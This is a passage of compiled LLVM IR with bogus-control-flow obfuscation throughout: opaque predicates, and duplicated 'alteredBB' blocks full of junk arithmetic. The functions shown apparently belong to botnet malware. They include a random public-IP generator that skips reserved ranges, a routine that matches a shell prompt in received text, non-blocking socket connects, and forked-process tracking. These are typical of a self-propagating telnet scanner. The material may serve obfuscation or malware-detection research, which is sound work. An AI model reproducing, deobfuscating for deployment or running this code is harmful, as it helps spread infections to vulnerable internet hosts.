; <label>:150:                                    ; preds = %127
  %151 = load i32, i32* @x.53
  %152 = load i32, i32* @y.54
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %150
  %159 = load i32, i32* @x.53
  %160 = load i32, i32* @y.54
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %168

; <label>:167:                                    ; preds = %111
  store i32 0, i32* %5, align 4
  br label %196

; <label>:168:                                    ; preds = %originalBBpart216
  br label %170

; <label>:169:                                    ; preds = %77
  store i32 0, i32* %5, align 4
  br label %196

; <label>:170:                                    ; preds = %168
  br label %171

; <label>:171:                                    ; preds = %170, %originalBBpart24
  %172 = load i32, i32* @x.53
  %173 = load i32, i32* @y.54
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %171
  %180 = load i32, i32* %6, align 4
  %181 = call i32 (i32, i32, ...) @fcntl(i32 %180, i32 3, i8* null)
  %182 = sext i32 %181 to i64
  store i64 %182, i64* %15, align 8
  %183 = load i64, i64* %15, align 8
  %184 = and i64 %183, -2049
  store i64 %184, i64* %15, align 8
  %185 = load i32, i32* %6, align 4
  %186 = load i64, i64* %15, align 8
  %187 = call i32 (i32, i32, ...) @fcntl(i32 %185, i32 4, i64 %186)
  store i32 1, i32* %5, align 4
  %188 = load i32, i32* @x.53
  %189 = load i32, i32* @y.54
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %196

; <label>:196:                                    ; preds = %originalBBpart231, %169, %167, %originalBBpart212, %originalBBpart2
  %197 = load i32, i32* %5, align 4
  ret i32 %197

originalBBalteredBB:                              ; preds = %originalBB, %36
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %199 = getelementptr inbounds [8 x i8], [8 x i8]* %198, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %199, i8 0, i64 8, i32 4, i1 false)
  %200 = load i32, i32* %6, align 4
  %201 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %202 = call i32 @connect(i32 %200, %struct.sockaddr* %201, i32 16)
  store i32 %202, i32* %16, align 4
  %203 = load i32, i32* %16, align 4
  %204 = icmp slt i32 %203, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %205 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %206 = getelementptr inbounds [16 x i64], [16 x i64]* %205, i64 0, i64 0
  %207 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %206) #5, !srcloc !4
  %208 = extractvalue { i64, i64* } %207, 0
  %209 = extractvalue { i64, i64* } %207, 1
  %210 = trunc i64 %208 to i32
  store i32 %210, i32* %17, align 4
  %211 = ptrtoint i64* %209 to i64
  %212 = trunc i64 %211 to i32
  store i32 %212, i32* %18, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  store i32 0, i32* %5, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %150
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %171
  %213 = load i32, i32* %6, align 4
  %214 = call i32 (i32, i32, ...) @fcntl(i32 %213, i32 3, i8* null)
  %215 = sext i32 %214 to i64
  store i64 %215, i64* %15, align 8
  %216 = load i64, i64* %15, align 8
  %_ = sub i64 0, %216
  %gen = add i64 %_, -2049
  %_19 = shl i64 %216, -2049
  %_20 = sub i64 0, %216
  %gen21 = add i64 %_20, -2049
  %_22 = shl i64 %216, -2049
  %_23 = shl i64 %216, -2049
  %_24 = shl i64 %216, -2049
  %_25 = sub i64 0, %216
  %gen26 = add i64 %_25, -2049
  %_27 = sub i64 0, %216
  %gen28 = add i64 %_27, -2049
  %_29 = shl i64 %216, -2049
  %217 = and i64 %216, -2049
  store i64 %217, i64* %15, align 8
  %218 = load i32, i32* %6, align 4
  %219 = load i64, i64* %15, align 8
  %220 = call i32 (i32, i32, ...) @fcntl(i32 %218, i32 4, i64 %219)
  store i32 1, i32* %5, align 4
  br label %originalBB18
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %63

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #5
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %originalBBpart2, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %53

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* @x.55
  %36 = load i32, i32* @y.56
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = add i32 %43, 1
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* @x.55
  %46 = load i32, i32* @y.56
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %18

; <label>:53:                                     ; preds = %18
  %54 = load i32, i32* %2, align 4
  %55 = load i32*, i32** %3, align 8
  %56 = load i64, i64* @numpids, align 8
  %57 = sub i64 %56, 1
  %58 = getelementptr inbounds i32, i32* %55, i64 %57
  store i32 %54, i32* %58, align 4
  %59 = load i32*, i32** @pids, align 8
  %60 = bitcast i32* %59 to i8*
  call void @free(i8* %60) #5
  %61 = load i32*, i32** %3, align 8
  store i32* %61, i32** @pids, align 8
  %62 = load i32, i32* %2, align 4
  store i32 %62, i32* %1, align 4
  br label %63

; <label>:63:                                     ; preds = %53, %8
  %64 = load i32, i32* @x.55
  %65 = load i32, i32* @y.56
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %63
  %72 = load i32, i32* %1, align 4
  %73 = load i32, i32* @x.55
  %74 = load i32, i32* @y.56
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  ret i32 %72

originalBBalteredBB:                              ; preds = %originalBB, %34
  %81 = load i32, i32* %4, align 4
  %_ = sub i32 0, %81
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %81
  %gen2 = add i32 %_1, 1
  %82 = add i32 %81, 1
  store i32 %82, i32* %4, align 4
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %63
  %83 = load i32, i32* %1, align 4
  br label %originalBB3
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.57
  %3 = load i32, i32* @y.58
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.262, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #9
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.57
  %20 = load i32, i32* @y.58
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %177, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = sext i32 %28 to i64
  %30 = load i8*, i8** %12, align 8
  %31 = call i64 @strlen(i8* %30) #9
  %32 = icmp ult i64 %29, %31
  br i1 %32, label %33, label %180

; <label>:33:                                     ; preds = %27
  %34 = load i32, i32* @x.57
  %35 = load i32, i32* @y.58
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* @x.57
  %43 = load i32, i32* @y.58
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart215, %originalBBpart24
  %51 = load i32, i32* %13, align 4
  %52 = load i32, i32* %15, align 4
  %53 = icmp sgt i32 %51, %52
  br i1 %53, label %54, label %104

; <label>:54:                                     ; preds = %50
  %55 = load i8*, i8** %11, align 8
  %56 = load i32, i32* %13, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i32, i32* %15, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %60
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %102, label %66

; <label>:66:                                     ; preds = %54
  %67 = load i8*, i8** %11, align 8
  %68 = load i32, i32* %13, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %15, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 32
  br i1 %77, label %102, label %78

; <label>:78:                                     ; preds = %66
  %79 = load i8*, i8** %11, align 8
  %80 = load i32, i32* %13, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i32, i32* %15, align 4
  %84 = sext i32 %83 to i64
  %85 = sub i64 0, %84
  %86 = getelementptr inbounds i8, i8* %82, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = icmp eq i32 %88, 13
  br i1 %89, label %102, label %90

; <label>:90:                                     ; preds = %78
  %91 = load i8*, i8** %11, align 8
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i32, i32* %15, align 4
  %96 = sext i32 %95 to i64
  %97 = sub i64 0, %96
  %98 = getelementptr inbounds i8, i8* %94, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = sext i8 %99 to i32
  %101 = icmp eq i32 %100, 10
  br label %102

; <label>:102:                                    ; preds = %90, %78, %66, %54
  %103 = phi i1 [ true, %78 ], [ true, %66 ], [ true, %54 ], [ %101, %90 ]
  br label %104

; <label>:104:                                    ; preds = %102, %50
  %105 = phi i1 [ false, %50 ], [ %103, %102 ]
  %106 = load i32, i32* @x.57
  %107 = load i32, i32* @y.58
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %104
  %114 = load i32, i32* @x.57
  %115 = load i32, i32* @y.58
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %105, label %122, label %141

; <label>:122:                                    ; preds = %originalBBpart28
  %123 = load i32, i32* @x.57
  %124 = load i32, i32* @y.58
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %122
  %131 = load i32, i32* %15, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %15, align 4
  %133 = load i32, i32* @x.57
  %134 = load i32, i32* @y.58
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart215, label %originalBB10alteredBB

originalBBpart215:                                ; preds = %originalBB10
  br label %50

; <label>:141:                                    ; preds = %originalBBpart28
  %142 = load i8*, i8** %11, align 8
  %143 = load i32, i32* %13, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  %146 = load i32, i32* %15, align 4
  %147 = sext i32 %146 to i64
  %148 = sub i64 0, %147
  %149 = getelementptr inbounds i8, i8* %145, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = load i8*, i8** %12, align 8
  %153 = load i32, i32* %14, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = icmp eq i32 %151, %157
  br i1 %158, label %159, label %176

; <label>:159:                                    ; preds = %141
  %160 = load i32, i32* @x.57
  %161 = load i32, i32* @y.58
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %159
  store i32 1, i32* %10, align 4
  %168 = load i32, i32* @x.57
  %169 = load i32, i32* @y.58
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %197

; <label>:176:                                    ; preds = %141
  br label %177

; <label>:177:                                    ; preds = %176
  %178 = load i32, i32* %14, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %14, align 4
  br label %27

; <label>:180:                                    ; preds = %27
  %181 = load i32, i32* @x.57
  %182 = load i32, i32* @y.58
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %180
  store i32 0, i32* %10, align 4
  %189 = load i32, i32* @x.57
  %190 = load i32, i32* @y.58
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %197

; <label>:197:                                    ; preds = %originalBBpart223, %originalBBpart219
  %198 = load i32, i32* %10, align 4
  ret i32 %198

originalBBalteredBB:                              ; preds = %originalBB, %1
  %199 = alloca i32, align 4
  %200 = alloca i8*, align 8
  %201 = alloca i8*, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  store i8* %0, i8** %200, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.262, i32 0, i32 0), i8** %201, align 8
  %205 = load i8*, i8** %200, align 8
  %206 = call i64 @strlen(i8* %205) #9
  %207 = trunc i64 %206 to i32
  store i32 %207, i32* %202, align 4
  store i32 0, i32* %204, align 4
  store i32 0, i32* %203, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %104
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %122
  %208 = load i32, i32* %15, align 4
  %_ = sub i32 %208, 1
  %gen = mul i32 %_, 1
  %_11 = sub i32 %208, 1
  %gen12 = mul i32 %_11, 1
  %_13 = shl i32 %208, 1
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %15, align 4
  br label %originalBB10

originalBB17alteredBB:                            ; preds = %originalBB17, %159
  store i32 1, i32* %10, align 4
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %180
  store i32 0, i32* %10, align 4
  br label %originalBB21
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %originalBBpart267, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %338, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %338, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %66

; <label>:26:                                     ; preds = %22
  %27 = load i32, i32* @x.59
  %28 = load i32, i32* @y.60
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp sge i32 %36, 64
  %38 = load i32, i32* @x.59
  %39 = load i32, i32* @y.60
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %66

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.59
  %48 = load i32, i32* @y.60
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 127
  %58 = load i32, i32* @x.59
  %59 = load i32, i32* @y.60
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %338, label %66

; <label>:66:                                     ; preds = %originalBBpart24, %originalBBpart2, %22
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 127
  br i1 %69, label %338, label %70

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* @x.59
  %72 = load i32, i32* @y.60
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 169
  %82 = load i32, i32* @x.59
  %83 = load i32, i32* @y.60
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %81, label %90, label %94

; <label>:90:                                     ; preds = %originalBBpart28
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 254
  br i1 %93, label %338, label %94

; <label>:94:                                     ; preds = %90, %originalBBpart28
  %95 = load i32, i32* @x.59
  %96 = load i32, i32* @y.60
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %94
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 172
  %106 = load i32, i32* @x.59
  %107 = load i32, i32* @y.60
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %105, label %114, label %138

; <label>:114:                                    ; preds = %originalBBpart212
  %115 = load i32, i32* @x.59
  %116 = load i32, i32* @y.60
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %114
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp sle i32 %124, 16
  %126 = load i32, i32* @x.59
  %127 = load i32, i32* @y.60
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %125, label %134, label %138

; <label>:134:                                    ; preds = %originalBBpart216
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp sle i32 %136, 31
  br i1 %137, label %338, label %138

; <label>:138:                                    ; preds = %134, %originalBBpart216, %originalBBpart212
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 192
  br i1 %141, label %142, label %182

; <label>:142:                                    ; preds = %138
  %143 = load i32, i32* @x.59
  %144 = load i32, i32* @y.60
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  %151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 0
  %154 = load i32, i32* @x.59
  %155 = load i32, i32* @y.60
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
